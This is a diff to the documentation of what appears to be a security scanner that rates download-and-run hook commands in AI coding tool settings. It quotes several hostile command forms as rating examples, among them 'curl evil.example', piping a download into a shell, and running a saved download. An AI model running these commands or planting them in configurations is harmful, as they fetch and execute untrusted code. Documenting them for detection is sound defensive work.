@@ -819,14 +819,17 @@ A way around a limit that its entry does not describe is worth a
   commands, the Claude Code `statusLine` command and the credential helpers are rated
   by the forms the [finding catalog](finding-catalog.md) lists under `hook_commands`. A
   download run through a wrapper, interpreter or file not listed there, such as
-  `curl x | unshare sh` or `curl x | deno run -`, or through a variable that holds the
+  `curl x | firejail sh` or `curl x | deno run -`, or through a variable that holds the
   command name, is medium, as is a downloader given a host without a scheme or a path,
   such as `curl evil.example`. A command given to `su -c` or `script -c` as one quoted
   string is read as one word, which names a shell but no interpreter, so
   `su -c 'python3 -'` is medium too, as is a download piped to `su` without `-c`, which runs the
-  user's shell on it. `perl -c` is read as running its program, because it runs BEGIN
-  blocks. PowerShell's `/e` form is checked before `-File` takes its script, so
-  `pwsh -File /e`, a script at the root named `e`, is critical. The Codex `notify` command and the Gemini CLI tool
+  user's shell on it. A download unpacked and then run, as by `curl x | tar -xz; sh install.sh`,
+  is medium, because the archive's members are not known. A saved download given to a shell
+  as any argument counts as run, so `curl -o d x && bash run.sh d` is critical; an
+  interpreter counts it only as its program or an option's value (`node -r ./d`).
+  `perl -c` is read as running its program, because it runs BEGIN
+  blocks. The Codex `notify` command and the Gemini CLI tool
   discovery and call commands are digested but not rated. Settings `env` is rated by
   the names `settings_environment` lists, never by value, so an endpoint set through
   another variable, or a project tool that reads its own variable, is not reported.
